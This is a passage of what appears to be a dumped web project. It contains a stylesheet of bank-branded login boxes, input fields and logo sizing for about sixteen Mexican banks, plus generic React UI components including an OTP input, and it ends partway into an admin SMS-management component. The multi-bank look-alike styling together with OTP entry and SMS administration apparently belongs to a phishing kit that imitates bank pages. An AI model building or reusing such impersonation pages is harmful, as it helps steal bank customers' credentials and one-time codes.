#0077C8;\n}\n\n.amex-text {\n  color: #0077C8;\n}\n\n.amex-accent {\n  color: #006FCF;\n}\n\n.amex-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #0077C8;\n}\n\n.amex-header {\n  text-align: center;\n  background-color: #0077C8;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n}\n\n.amex-button {\n  background-color: #0077C8;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.amex-button:hover {\n  background-color: #005FA3;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Estilos para Santander */\n.santander-bg {\n  background-color: #EC0000;\n}\n\n.santander-text {\n  color: #EC0000;\n}\n\n.santander-accent {\n  color: #FFFFFF;\n}\n\n.santander-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #EC0000;\n}\n\n.santander-header {\n  text-align: center;\n  background-color: #EC0000;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.santander-button {\n  background-color: #EC0000;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.santander-button:hover {\n  background-color: #CC0000;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Estilos para Scotiabank */\n.scotiabank-bg {\n  background-color: #EC111A;\n}\n\n.scotiabank-text {\n  color: #EC111A;\n}\n\n.scotiabank-accent {\n  color: #FFFFFF;\n}\n\n.scotiabank-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #EC111A;\n}\n\n.scotiabank-header {\n  text-align: center;\n  background-color: #EC111A;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.scotiabank-button {\n  background-color: #EC111A;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.scotiabank-button:hover {\n  background-color: #C70012;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Estilos para INVEX */\n.invex-bg {\n  background-color: #BE0046;\n}\n\n.invex-text {\n  color: #BE0046;\n}\n\n.invex-accent {\n  color: #FFFFFF;\n}\n\n/* Estilos para Banco Azteca */\n.banco-azteca-bg {\n  background-color: #00A552;\n}\n\n.banco-azteca-text {\n  color: #00A552;\n}\n\n.banco-azteca-accent {\n  color: #FFFFFF;\n}\n\n.banco-azteca-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #00A552;\n}\n\n.banco-azteca-header {\n  text-align: center;\n  background-color: #00A552;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.banco-azteca-button {\n  background-color: #00A552;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.banco-azteca-button:hover {\n  background-color: #008C45;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Estilos para Banco del Bienestar */\n.bienestar-bg {\n  background-color: #9D2449;\n}\n\n.bienestar-text {\n  color: #9D2449;\n}\n\n.bienestar-accent {\n  color: #FFFFFF;\n}\n\n.bienestar-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #9D2449;\n}\n\n.bienestar-header {\n  text-align: center;\n  background-color: #9D2449;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.bienestar-button {\n  background-color: #9D2449;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.bienestar-button:hover {\n  background-color: #7E1D3B;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Contenido original del CSS */\n.invex-accent {\n  color: #FFFFFF;\n}\n\n.invex-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #BE0046;\n}\n\n.invex-header {\n  text-align: center;\n  background-color: #BE0046;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.invex-button {\n  background-color: #BE0046;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.invex-button:hover {\n  background-color: #9C0039;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n\n.hsbc-header {\n  text-align: center;\n  background-color: transparent;\n  padding: 12px;\n  font-weight: bold;\n  color: #333;\n  font-size: 16px;\n}\n\n.hsbc-footer {\n  background-color: #2e2e2e;\n  color: white;\n  padding: 15px;\n  font-size: 12px;\n  width: 100%;\n  text-align: center;\n  position: fixed;\n  bottom: 0;\n  left: 0;\n}\n\n.hsbc-input {\n  width: 100%;\n  padding: 10px;\n  margin: 10px 0;\n  border: 1px solid #ccc;\n  border-radius: 4px;\n}\n\n.hsbc-links {\n  margin-top: 15px;\n  font-size: 14px;\n}\n\n.hsbc-links a {\n  color: #DB0011;\n  text-decoration: none;\n  margin: 0 5px;\n}\n\n.hsbc-links a:hover {\n  text-decoration: underline;\n}\n\n/* Estilos espec铆ficos para cada logo de banco */\n/* Tama帽os personalizados seg煤n las proporciones y dimensiones oficiales de cada banco */\n\n/* Tama帽o general por defecto */\nheader img {\n  height: auto !important;\n  width: auto !important;\n  object-fit: contain !important;\n}\n\n/* BBVA - logo m谩s peque帽o con proporciones espec铆ficas */\n.bbva-logo {\n  max-height: 30px !important;\n  max-width: 85px !important;\n}\n\n/* Liverpool - logo proporcionalmente correcto */\n.liverpool-logo {\n  max-height: 35px !important;\n}\n\n/* Banorte - logo oficial con buen tama帽o (aumentado 20%) */\n.banorte-logo {\n  max-height: 48px !important; /* Aumentado un 20% de 40px */\n}\n\n/* HSBC - logo m谩s grande */\n.hsbc-logo {\n  max-height: 45px !important;\n}\n\n/* Banamex - logo con proporciones espec铆ficas */\n.banamex-logo {\n  max-height: 35px !important;\n  max-width: 160px !important;\n}\n\n/* AMEX - logo peque帽o pero reconocible */\n.amex-logo {\n  max-height: 38px !important;\n}\n\n/* Santander - logo proporcionalmente correcto (duplicado) */\n.santander-logo {\n  max-height: 120px !important; /* Duplicado el tama帽o actual (60px) */\n}\n\n/* Scotiabank - logo apropiado al estilo oficial */\n.scotiabank-logo {\n  max-height: 38px !important;\n}\n\n/* INVEX - logo peque帽o pero claro */\n.invex-logo {\n  height: 2.5rem !important; /* h-10 */\n  max-height: 36px !important;\n  width: auto;\n}\n\n/* Banregio - logo de tama帽o moderado */\n.banregio-logo {\n  max-height: 38px !important;\n}\n\n/* SPIN - logo de tama帽o moderado */\n.spin-logo {\n  max-height: 36px !important;\n}\n\n/* BanCoppel - logo m谩s peque帽o */\n.bancoppel-logo {\n  max-height: 32px !important;\n}\n\n/* BanBaj铆o - logo con proporciones espec铆ficas */\n.banbajio-logo {\n  max-height: 36px !important;\n}\n\n/* Banco Azteca - tama帽o duplicado */\n.banco-azteca-logo {\n  max-height: 200px !important; /* Duplicado el tama帽o actual */\n}\n\n/* Banco del Bienestar - logo proporcionalmente correcto */\n.bienestar-logo {\n  max-height: 38px !important;\n}\n\n/* Estilos para Spin by OXXO */\n.spin-bg {\n  background-color: #7200A4;\n}\n\n.spin-text {\n  color: #7200A4;\n}\n\n.spin-accent {\n  color: #000000;\n}\n\n.spin-button {\n  background-color: #7200A4;\n  color: white;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.spin-button:hover {\n  background-color: #5A0082;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.spin-container {\n  background: white;\n  margin: 20px auto;\n  padding: 25px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n}\n\n.spin-header {\n  text-align: center;\n  background-color: #7200A4;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  border-bottom: 1px solid #ddd;\n  font-size: 16px;\n}\n\n/* Estilos para Liverpool */\n.liverpool-bg {\n  background-color: #E1147B;\n}\n\n.liverpool-text {\n  color: #E1147B;\n}\n\n.liverpool-accent {\n  color: #FFFFFF;\n}\n\n.liverpool-button {\n  background-color: #E1147B;\n  color: white;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n}\n\n.liverpool-button:hover {\n  background-color: #c0126a;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.liverpool-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #E1147B;\n}\n\n.liverpool-header {\n  text-align: center;\n  background-color: #E1147B;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.liverpool-bg.animate-progress-bar {\n  background: linear-gradient(to right, #E1147B, #ff3399);\n}\n\n/* Estilos para Banregio */\n.banregio-bg {\n  background-color: #FF6600;\n}\n\n.banregio-text {\n  color: #FF6600;\n}\n\n.banregio-accent {\n  color: #FFFFFF;\n}\n\n.banregio-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #FF6600;\n}\n\n.banregio-header {\n  text-align: center;\n  background-color: #FF6600;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.banregio-button {\n  background-color: #FF6600;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.banregio-button:hover {\n  background-color: #E05A00;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n/* Estilos para Inbursa */\n.inbursa-bg {\n  background-color: #1B4B72;\n}\n\n.inbursa-text {\n  color: #1B4B72;\n}\n\n.inbursa-accent {\n  color: #2A8B8B;\n}\n\n.inbursa-container {\n  background: white;\n  margin: 20px auto;\n  padding: 30px;\n  border-radius: 8px;\n  text-align: center;\n  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);\n  max-width: 400px;\n  border: 1px solid #1B4B72;\n}\n\n.inbursa-header {\n  text-align: center;\n  background-color: #1B4B72;\n  padding: 12px;\n  font-weight: bold;\n  color: white;\n  font-size: 16px;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n.inbursa-button {\n  background-color: #1B4B72;\n  color: white;\n  border: none;\n  border-radius: 4px;\n  padding: 10px 20px;\n  font-weight: bold;\n  transition: all 0.2s ease;\n  width: 100%;\n  cursor: pointer;\n  font-size: 16px;\n}\n\n.inbursa-button:hover {\n  background-color: #144060;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.inbursa-bg.animate-progress-bar {\n  background: linear-gradient(to right, #1B4B72, #2A8B8B);\n}","size_bytes":27241},"client/src/hooks/use-mobile.tsx":{"content":"import * as React from \"react\"\n\nconst MOBILE_BREAKPOINT = 768\n\nexport function useIsMobile() {\n  const [isMobile, setIsMobile] = React.useState<boolean | undefined>(undefined)\n\n  React.useEffect(() => {\n    const mql = window.matchMedia(`(max-width: ${MOBILE_BREAKPOINT - 1}px)`)\n    const onChange = () => {\n      setIsMobile(window.innerWidth < MOBILE_BREAKPOINT)\n    }\n    mql.addEventListener(\"change\", onChange)\n    setIsMobile(window.innerWidth < MOBILE_BREAKPOINT)\n    return () => mql.removeEventListener(\"change\", onChange)\n  }, [])\n\n  return !!isMobile\n}\n","size_bytes":565},"client/src/components/ui/input-otp.tsx":{"content":"import * as React from \"react\"\nimport { OTPInput, OTPInputContext } from \"input-otp\"\nimport { Dot } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst InputOTP = React.forwardRef<\n  React.ElementRef<typeof OTPInput>,\n  React.ComponentPropsWithoutRef<typeof OTPInput>\n>(({ className, containerClassName, ...props }, ref) => (\n  <OTPInput\n    ref={ref}\n    containerClassName={cn(\n      \"flex items-center gap-2 has-[:disabled]:opacity-50\",\n      containerClassName\n    )}\n    className={cn(\"disabled:cursor-not-allowed\", className)}\n    {...props}\n  />\n))\nInputOTP.displayName = \"InputOTP\"\n\nconst InputOTPGroup = React.forwardRef<\n  React.ElementRef<\"div\">,\n  React.ComponentPropsWithoutRef<\"div\">\n>(({ className, ...props }, ref) => (\n  <div ref={ref} className={cn(\"flex items-center\", className)} {...props} />\n))\nInputOTPGroup.displayName = \"InputOTPGroup\"\n\nconst InputOTPSlot = React.forwardRef<\n  React.ElementRef<\"div\">,\n  React.ComponentPropsWithoutRef<\"div\"> & { index: number }\n>(({ index, className, ...props }, ref) => {\n  const inputOTPContext = React.useContext(OTPInputContext)\n  const { char, hasFakeCaret, isActive } = inputOTPContext.slots[index]\n\n  return (\n    <div\n      ref={ref}\n      className={cn(\n        \"relative flex h-10 w-10 items-center justify-center border-y border-r border-input text-sm transition-all first:rounded-l-md first:border-l last:rounded-r-md\",\n        isActive && \"z-10 ring-2 ring-ring ring-offset-background\",\n        className\n      )}\n      {...props}\n    >\n      {char}\n      {hasFakeCaret && (\n        <div className=\"pointer-events-none absolute inset-0 flex items-center justify-center\">\n          <div className=\"h-4 w-px animate-caret-blink bg-foreground duration-1000\" />\n        </div>\n      )}\n    </div>\n  )\n})\nInputOTPSlot.displayName = \"InputOTPSlot\"\n\nconst InputOTPSeparator = React.forwardRef<\n  React.ElementRef<\"div\">,\n  React.ComponentPropsWithoutRef<\"div\">\n>(({ ...props }, ref) => (\n  <div ref={ref} role=\"separator\" {...props}>\n    <Dot />\n  </div>\n))\nInputOTPSeparator.displayName = \"InputOTPSeparator\"\n\nexport { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator }\n","size_bytes":2154},"client/src/components/ui/resizable.tsx":{"content":"import { GripVertical } from \"lucide-react\"\nimport * as ResizablePrimitive from \"react-resizable-panels\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ResizablePanelGroup = ({\n  className,\n  ...props\n}: React.ComponentProps<typeof ResizablePrimitive.PanelGroup>) => (\n  <ResizablePrimitive.PanelGroup\n    className={cn(\n      \"flex h-full w-full data-[panel-group-direction=vertical]:flex-col\",\n      className\n    )}\n    {...props}\n  />\n)\n\nconst ResizablePanel = ResizablePrimitive.Panel\n\nconst ResizableHandle = ({\n  withHandle,\n  className,\n  ...props\n}: React.ComponentProps<typeof ResizablePrimitive.PanelResizeHandle> & {\n  withHandle?: boolean\n}) => (\n  <ResizablePrimitive.PanelResizeHandle\n    className={cn(\n      \"relative flex w-px items-center justify-center bg-border after:absolute after:inset-y-0 after:left-1/2 after:w-1 after:-translate-x-1/2 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring focus-visible:ring-offset-1 data-[panel-group-direction=vertical]:h-px data-[panel-group-direction=vertical]:w-full data-[panel-group-direction=vertical]:after:left-0 data-[panel-group-direction=vertical]:after:h-1 data-[panel-group-direction=vertical]:after:w-full data-[panel-group-direction=vertical]:after:-translate-y-1/2 data-[panel-group-direction=vertical]:after:translate-x-0 [&[data-panel-group-direction=vertical]>div]:rotate-90\",\n      className\n    )}\n    {...props}\n  >\n    {withHandle && (\n      <div className=\"z-10 flex h-4 w-3 items-center justify-center rounded-sm border bg-border\">\n        <GripVertical className=\"h-2.5 w-2.5\" />\n      </div>\n    )}\n  </ResizablePrimitive.PanelResizeHandle>\n)\n\nexport { ResizablePanelGroup, ResizablePanel, ResizableHandle }\n","size_bytes":1709},"client/src/components/ui/textarea.tsx":{"content":"import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nexport interface TextareaProps\n  extends React.TextareaHTMLAttributes<HTMLTextAreaElement> {}\n\nconst Textarea = React.forwardRef<HTMLTextAreaElement, TextareaProps>(\n  ({ className, ...props }, ref) => {\n    return (\n      <textarea\n        className={cn(\n          \"flex min-h-[80px] w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50\",\n          className\n        )}\n        ref={ref}\n        {...props}\n      />\n    )\n  }\n)\nTextarea.displayName = \"Textarea\"\n\nexport { Textarea }\n","size_bytes":772},"client/src/components/ui/input.tsx":{"content":"import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nexport interface InputProps\n  extends React.InputHTMLAttributes<HTMLInputElement> {}\n\nconst Input = React.forwardRef<HTMLInputElement, InputProps>(\n  ({ className, type, ...props }, ref) => {\n    return (\n      <input\n        type={type}\n        className={cn(\n          \"flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50\",\n          className\n        )}\n        ref={ref}\n        {...props}\n      />\n    )\n  }\n)\nInput.displayName = \"Input\"\n\nexport { Input }\n","size_bytes":845},"client/src/hooks/use-toast.ts":{"content":"import * as React from \"react\"\n\nimport type {\n  ToastActionElement,\n  ToastProps,\n} from \"@/components/ui/toast\"\n\nconst TOAST_LIMIT = 1\nconst TOAST_REMOVE_DELAY = 1000000\n\ntype ToasterToast = ToastProps & {\n  id: string\n  title?: React.ReactNode\n  description?: React.ReactNode\n  action?: ToastActionElement\n}\n\nconst actionTypes = {\n  ADD_TOAST: \"ADD_TOAST\",\n  UPDATE_TOAST: \"UPDATE_TOAST\",\n  DISMISS_TOAST: \"DISMISS_TOAST\",\n  REMOVE_TOAST: \"REMOVE_TOAST\",\n} as const\n\nlet count = 0\n\nfunction genId() {\n  count = (count + 1) % Number.MAX_SAFE_INTEGER\n  return count.toString()\n}\n\ntype ActionType = typeof actionTypes\n\ntype Action =\n  | {\n      type: ActionType[\"ADD_TOAST\"]\n      toast: ToasterToast\n    }\n  | {\n      type: ActionType[\"UPDATE_TOAST\"]\n      toast: Partial<ToasterToast>\n    }\n  | {\n      type: ActionType[\"DISMISS_TOAST\"]\n      toastId?: ToasterToast[\"id\"]\n    }\n  | {\n      type: ActionType[\"REMOVE_TOAST\"]\n      toastId?: ToasterToast[\"id\"]\n    }\n\ninterface State {\n  toasts: ToasterToast[]\n}\n\nconst toastTimeouts = new Map<string, ReturnType<typeof setTimeout>>()\n\nconst addToRemoveQueue = (toastId: string) => {\n  if (toastTimeouts.has(toastId)) {\n    return\n  }\n\n  const timeout = setTimeout(() => {\n    toastTimeouts.delete(toastId)\n    dispatch({\n      type: \"REMOVE_TOAST\",\n      toastId: toastId,\n    })\n  }, TOAST_REMOVE_DELAY)\n\n  toastTimeouts.set(toastId, timeout)\n}\n\nexport const reducer = (state: State, action: Action): State => {\n  switch (action.type) {\n    case \"ADD_TOAST\":\n      return {\n        ...state,\n        toasts: [action.toast, ...state.toasts].slice(0, TOAST_LIMIT),\n      }\n\n    case \"UPDATE_TOAST\":\n      return {\n        ...state,\n        toasts: state.toasts.map((t) =>\n          t.id === action.toast.id ? { ...t, ...action.toast } : t\n        ),\n      }\n\n    case \"DISMISS_TOAST\": {\n      const { toastId } = action\n\n      // ! Side effects ! - This could be extracted into a dismissToast() action,\n      // but I'll keep it here for simplicity\n      if (toastId) {\n        addToRemoveQueue(toastId)\n      } else {\n        state.toasts.forEach((toast) => {\n          addToRemoveQueue(toast.id)\n        })\n      }\n\n      return {\n        ...state,\n        toasts: state.toasts.map((t) =>\n          t.id === toastId || toastId === undefined\n            ? {\n                ...t,\n                open: false,\n              }\n            : t\n        ),\n      }\n    }\n    case \"REMOVE_TOAST\":\n      if (action.toastId === undefined) {\n        return {\n          ...state,\n          toasts: [],\n        }\n      }\n      return {\n        ...state,\n        toasts: state.toasts.filter((t) => t.id !== action.toastId),\n      }\n  }\n}\n\nconst listeners: Array<(state: State) => void> = []\n\nlet memoryState: State = { toasts: [] }\n\nfunction dispatch(action: Action) {\n  memoryState = reducer(memoryState, action)\n  listeners.forEach((listener) => {\n    listener(memoryState)\n  })\n}\n\ntype Toast = Omit<ToasterToast, \"id\">\n\nfunction toast({ ...props }: Toast) {\n  const id = genId()\n\n  const update = (props: ToasterToast) =>\n    dispatch({\n      type: \"UPDATE_TOAST\",\n      toast: { ...props, id },\n    })\n  const dismiss = () => dispatch({ type: \"DISMISS_TOAST\", toastId: id })\n\n  dispatch({\n    type: \"ADD_TOAST\",\n    toast: {\n      ...props,\n      id,\n      open: true,\n      onOpenChange: (open) => {\n        if (!open) dismiss()\n      },\n    },\n  })\n\n  return {\n    id: id,\n    dismiss,\n    update,\n  }\n}\n\nfunction useToast() {\n  const [state, setState] = React.useState<State>(memoryState)\n\n  React.useEffect(() => {\n    listeners.push(setState)\n    return () => {\n      const index = listeners.indexOf(setState)\n      if (index > -1) {\n        listeners.splice(index, 1)\n      }\n    }\n  }, [state])\n\n  return {\n    ...state,\n    toast,\n    dismiss: (toastId?: string) => dispatch({ type: \"DISMISS_TOAST\", toastId }),\n  }\n}\n\nexport { useToast, toast }\n","size_bytes":3895},"client/src/components/ui/navigation-menu.tsx":{"content":"import * as React from \"react\"\nimport * as NavigationMenuPrimitive from \"@radix-ui/react-navigation-menu\"\nimport { cva } from \"class-variance-authority\"\nimport { ChevronDown } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst NavigationMenu = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.Root>\n>(({ className, children, ...props }, ref) => (\n  <NavigationMenuPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"relative z-10 flex max-w-max flex-1 items-center justify-center\",\n      className\n    )}\n    {...props}\n  >\n    {children}\n    <NavigationMenuViewport />\n  </NavigationMenuPrimitive.Root>\n))\nNavigationMenu.displayName = NavigationMenuPrimitive.Root.displayName\n\nconst NavigationMenuList = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.List>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.List>\n>(({ className, ...props }, ref) => (\n  <NavigationMenuPrimitive.List\n    ref={ref}\n    className={cn(\n      \"group flex flex-1 list-none items-center justify-center space-x-1\",\n      className\n    )}\n    {...props}\n  />\n))\nNavigationMenuList.displayName = NavigationMenuPrimitive.List.displayName\n\nconst NavigationMenuItem = NavigationMenuPrimitive.Item\n\nconst navigationMenuTriggerStyle = cva(\n  \"group inline-flex h-10 w-max items-center justify-center rounded-md bg-background px-4 py-2 text-sm font-medium transition-colors hover:bg-accent hover:text-accent-foreground focus:bg-accent focus:text-accent-foreground focus:outline-none disabled:pointer-events-none disabled:opacity-50 data-[active]:bg-accent/50 data-[state=open]:bg-accent/50\"\n)\n\nconst NavigationMenuTrigger = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.Trigger>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.Trigger>\n>(({ className, children, ...props }, ref) => (\n  <NavigationMenuPrimitive.Trigger\n    ref={ref}\n    className={cn(navigationMenuTriggerStyle(), \"group\", className)}\n    {...props}\n  >\n    {children}{\" \"}\n    <ChevronDown\n      className=\"relative top-[1px] ml-1 h-3 w-3 transition duration-200 group-data-[state=open]:rotate-180\"\n      aria-hidden=\"true\"\n    />\n  </NavigationMenuPrimitive.Trigger>\n))\nNavigationMenuTrigger.displayName = NavigationMenuPrimitive.Trigger.displayName\n\nconst NavigationMenuContent = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.Content>\n>(({ className, ...props }, ref) => (\n  <NavigationMenuPrimitive.Content\n    ref={ref}\n    className={cn(\n      \"left-0 top-0 w-full data-[motion^=from-]:animate-in data-[motion^=to-]:animate-out data-[motion^=from-]:fade-in data-[motion^=to-]:fade-out data-[motion=from-end]:slide-in-from-right-52 data-[motion=from-start]:slide-in-from-left-52 data-[motion=to-end]:slide-out-to-right-52 data-[motion=to-start]:slide-out-to-left-52 md:absolute md:w-auto \",\n      className\n    )}\n    {...props}\n  />\n))\nNavigationMenuContent.displayName = NavigationMenuPrimitive.Content.displayName\n\nconst NavigationMenuLink = NavigationMenuPrimitive.Link\n\nconst NavigationMenuViewport = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.Viewport>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.Viewport>\n>(({ className, ...props }, ref) => (\n  <div className={cn(\"absolute left-0 top-full flex justify-center\")}>\n    <NavigationMenuPrimitive.Viewport\n      className={cn(\n        \"origin-top-center relative mt-1.5 h-[var(--radix-navigation-menu-viewport-height)] w-full overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-lg data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-90 md:w-[var(--radix-navigation-menu-viewport-width)]\",\n        className\n      )}\n      ref={ref}\n      {...props}\n    />\n  </div>\n))\nNavigationMenuViewport.displayName =\n  NavigationMenuPrimitive.Viewport.displayName\n\nconst NavigationMenuIndicator = React.forwardRef<\n  React.ElementRef<typeof NavigationMenuPrimitive.Indicator>,\n  React.ComponentPropsWithoutRef<typeof NavigationMenuPrimitive.Indicator>\n>(({ className, ...props }, ref) => (\n  <NavigationMenuPrimitive.Indicator\n    ref={ref}\n    className={cn(\n      \"top-full z-[1] flex h-1.5 items-end justify-center overflow-hidden data-[state=visible]:animate-in data-[state=hidden]:animate-out data-[state=hidden]:fade-out data-[state=visible]:fade-in\",\n      className\n    )}\n    {...props}\n  >\n    <div className=\"relative top-[60%] h-2 w-2 rotate-45 rounded-tl-sm bg-border shadow-md\" />\n  </NavigationMenuPrimitive.Indicator>\n))\nNavigationMenuIndicator.displayName =\n  NavigationMenuPrimitive.Indicator.displayName\n\nexport {\n  navigationMenuTriggerStyle,\n  NavigationMenu,\n  NavigationMenuList,\n  NavigationMenuItem,\n  NavigationMenuContent,\n  NavigationMenuTrigger,\n  NavigationMenuLink,\n  NavigationMenuIndicator,\n  NavigationMenuViewport,\n}\n","size_bytes":5046},"client/src/components/ui/tooltip.tsx":{"content":"import * as React from \"react\"\nimport * as TooltipPrimitive from \"@radix-ui/react-tooltip\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst TooltipProvider = TooltipPrimitive.Provider\n\nconst Tooltip = TooltipPrimitive.Root\n\nconst TooltipTrigger = TooltipPrimitive.Trigger\n\nconst TooltipContent = React.forwardRef<\n  React.ElementRef<typeof TooltipPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof TooltipPrimitive.Content>\n>(({ className, sideOffset = 4, ...props }, ref) => (\n  <TooltipPrimitive.Content\n    ref={ref}\n    sideOffset={sideOffset}\n    className={cn(\n      \"z-50 overflow-hidden rounded-md border bg-popover px-3 py-1.5 text-sm text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n      className\n    )}\n    {...props}\n  />\n))\nTooltipContent.displayName = TooltipPrimitive.Content.displayName\n\nexport { Tooltip, TooltipTrigger, TooltipContent, TooltipProvider }\n","size_bytes":1145},"client/src/components/admin/SmsManagement.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation, useQueryClient } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from 